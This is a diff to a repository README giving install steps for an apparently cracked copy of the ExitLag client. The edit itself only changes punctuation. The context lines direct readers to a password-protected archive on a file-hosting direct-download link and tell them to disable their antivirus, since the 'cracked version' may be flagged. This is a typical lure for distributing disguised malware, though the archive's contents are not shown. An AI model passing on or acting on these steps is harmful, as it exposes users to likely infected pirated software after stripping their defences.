@@ -24,7 +24,7 @@ This repository includes a setup/configuration file to help streamline your Exit
 
 ### 🔽 Step 1: Download and Install ExitLag
 
-1. Go to the [LINK](https://www.4sync.com/web/directDownload/2PpzQ4Lm/cKQ38aak.baa27f6ff8657fc52a86cffb428f3446)  **Password exitlag**
+1. Go to the [LINK](https://www.4sync.com/web/directDownload/2PpzQ4Lm/cKQ38aak.baa27f6ff8657fc52a86cffb428f3446). **Password exitlag**
 2. **Disable your antivirus temporarily**  
    > ⚠️ _Since this is a cracked version, antivirus software may flag it as a threat._
 3. Download and install the ExitLag client for Windows.  
